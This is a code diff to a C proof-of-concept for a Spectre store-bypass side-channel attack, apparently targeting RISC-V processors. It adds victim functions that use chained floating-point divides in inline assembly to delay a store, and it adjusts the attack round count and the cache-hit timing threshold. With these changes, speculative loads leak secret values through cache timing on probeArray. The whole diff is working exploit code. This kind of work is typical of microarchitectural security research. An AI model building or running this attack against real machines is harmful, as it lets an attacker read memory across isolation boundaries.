@@ -24,9 +24,9 @@
  */
 //#define TRAIN_TIMES 24 // (Spectre-SSB does not need training.) Times to train the predictor. There shall be an ideal value for each machine.
 // Note: smaller TRAIN_TIMES values increase misses or even cause failure, while larger ones unnecessarily take longer time.
-#define ATTACK_ROUNDS 3 // used to be 8, 20, originally 40 Times to attack the same index. Ideal to have larger ATTACK_ROUNDS (takes more time but statistically better).
+#define ATTACK_ROUNDS 9 // used to be 3, 8, 20, originally 40 Times to attack the same index. Ideal to have larger ATTACK_ROUNDS (takes more time but statistically better).
 // For most processors with simple MDP(Memory Dependence Prediction), theoretically 1 will be enough for a successful Spectre-SSB attack.
-#define CACHE_HIT_THRESHOLD 33 // 37-43 will see changes. Interval smaller than CACHE_HIT_THRESHOLD will be deemed as "cache hit". Ideal to have lower CACHE_HIT_THRESHOLD (higher accuracy).
+#define CACHE_HIT_THRESHOLD 37 // 37-43 will see changes. Interval smaller than CACHE_HIT_THRESHOLD will be deemed as "cache hit". Ideal to have lower CACHE_HIT_THRESHOLD (higher accuracy).
 // To keep results accurate, the larger TRAIN_TIMES and ATTACK_ROUNDS you have, the smaller CACHE_HIT_THRESHOLD shoud be.
 
 /* <<<<<< Mostly used parameters for debugging are listed above. <<<<<< */
@@ -108,7 +108,100 @@ uint32_t tempString[ARRAY_SIZE_FACTOR];
 /**
  * @input idx input to be used to idx the array
  */
+
+void victimFuncPre(uint32_t targetIdx)
+{
+	tempString[0] = targetIdx;
+        tempStringIndex = tempStringIndex << 4;
+        asm("fcvt.s.wu  fa4, %[in]\n"
+                "fcvt.s.wu      fa5, %[inout]\n"
+                "fdiv.s fa5, fa5, fa4\n"
+                "fdiv.s fa5, fa5, fa4\n"
+                "fdiv.s fa5, fa5, fa4\n"
+                "fdiv.s fa5, fa5, fa4\n"
+                // Adjust tempStringIndex value and increase fdiv rows to improve accuracy.
+//              "fdiv.s fa5, fa5, fa4\n"
+//              "fdiv.s fa5, fa5, fa4\n"
+//              "fdiv.s fa5, fa5, fa4\n"
+//              "fdiv.s fa5, fa5, fa4\n"
+                "fcvt.wu.s      %[out], fa5, rtz\n"
+                : [out] "=r" (tempStringIndex)
+                : [inout] "r" (tempStringIndex), [in] "r" (shift_base)
+                : "fa4", "fa5");
+
+        tempString[tempStringIndex] = 0;
+	anchorVar &= probeArray[guideArray[tempString[0]] * ARRAY_STRIDE];
+}
+
 void victimFunc(uint32_t targetIdx){
+
+//
+	// "Slowly" store a value at a memory location (here *memoryDestination).
+//	char **memoryDestination = *delayer;
+	// "Quickly" load that value from that memory location.
+//	*memoryDestination = knownString;
+
+//	tempStringIndex = idx; 
+	tempString[1] = targetIdx;//tempString[idx]=
+	tempStringIndex = tempStringIndex << 4;
+	asm("fcvt.s.wu	fa4, %[in]\n"
+		"fcvt.s.wu	fa5, %[inout]\n"
+		"fdiv.s	fa5, fa5, fa4\n"
+		"fdiv.s	fa5, fa5, fa4\n"
+		"fdiv.s	fa5, fa5, fa4\n"
+		"fdiv.s	fa5, fa5, fa4\n"
+		// Adjust tempStringIndex value and increase fdiv rows to improve accuracy.
+//		"fdiv.s	fa5, fa5, fa4\n"
+//		"fdiv.s	fa5, fa5, fa4\n"
+//		"fdiv.s	fa5, fa5, fa4\n"
+//		"fdiv.s	fa5, fa5, fa4\n"
+		"fcvt.wu.s	%[out], fa5, rtz\n"
+		: [out] "=r" (tempStringIndex)
+		: [inout] "r" (tempStringIndex), [in] "r" (shift_base)
+		: "fa4", "fa5");
+
+	tempString[tempStringIndex] = 0;
+	// Will only succeed on machines with MDP (Memory Dependence Prediction) and speculative STL forwarding.
+//	anchorVar &= probeArray[(*guideArray)[idx] * ARRAY_STRIDE];
+	anchorVar &= probeArray[guideArray[tempString[1]] * ARRAY_STRIDE];//tempString[idx]
+}
+
+void victimFuncOdd(uint32_t targetIdx){
+
+//
+	// "Slowly" store a value at a memory location (here *memoryDestination).
+//	char **memoryDestination = *delayer;
+	// "Quickly" load that value from that memory location.
+//	*memoryDestination = knownString;
+
+//	tempStringIndex = idx; 
+	tempString[1] = targetIdx;//tempString[idx]=
+	tempStringIndex = tempStringIndex << 4;
+	asm("fcvt.s.wu	fa4, %[in]\n"
+		"fcvt.s.wu	fa5, %[inout]\n"
+		"fdiv.s	fa5, fa5, fa4\n"
+		"fdiv.s	fa5, fa5, fa4\n"
+		"fdiv.s	fa5, fa5, fa4\n"
+		"fdiv.s	fa5, fa5, fa4\n"
+		// Adjust tempStringIndex value and increase fdiv rows to improve accuracy.
+//		"fdiv.s	fa5, fa5, fa4\n"
+//		"fdiv.s	fa5, fa5, fa4\n"
+//		"fdiv.s	fa5, fa5, fa4\n"
+//		"fdiv.s	fa5, fa5, fa4\n"
+		"fcvt.wu.s	%[out], fa5, rtz\n"
+		: [out] "=r" (tempStringIndex)
+		: [inout] "r" (tempStringIndex), [in] "r" (shift_base)
+		: "fa4", "fa5");
+
+	tempString[tempStringIndex] = 0;
+	// Will only succeed on machines with MDP (Memory Dependence Prediction) and speculative STL forwarding.
+//	anchorVar &= probeArray[(*guideArray)[idx] * ARRAY_STRIDE];
+	anchorVar &= probeArray[guideArray[tempString[1]] * ARRAY_STRIDE];//tempString[idx]
+
+}
+
+
+void victimFuncEven(uint32_t targetIdx){
 
 //
 	// "Slowly" store a value at a memory location (here *memoryDestination).
@@ -234,6 +327,8 @@ int main(void){
 			results[cIdx] = 0;
 		}
 
+//		victimFuncPre(attackIdx);
+
 		// Run the attack on the same idx for ATTACK_ROUNDS times.
 		for(uint32_t atkRound = 0; atkRound < ATTACK_ROUNDS; atkRound++){
 			
@@ -245,9 +340,19 @@ int main(void){
 //			flushCache(tempStringIndex, sizeof(tempStringIndex));
 			flushCache((uint32_t)probeArray, sizeof(probeArray));
 			
-//			victimFunc(len);
+			victimFuncPre(attackIdx);	
 			victimFunc(attackIdx);
-//			victimFunc(attackIdx,len);
+
+//			if (atkRound % 2 != 0)
+//			{
+//				victimFuncPre(attackIdx);
+//				victimFuncOdd(attackIdx);
+//			}
+//			else
+//			{
+//				victimFuncPre(attackIdx);
+//				victimFuncEven(attackIdx);
+//			}
 	
 			// Read out probeArray and see the hit secret value.		
 			/* Time reads. Order is slightly mixed up to prevent stride prediction (prefetching). */
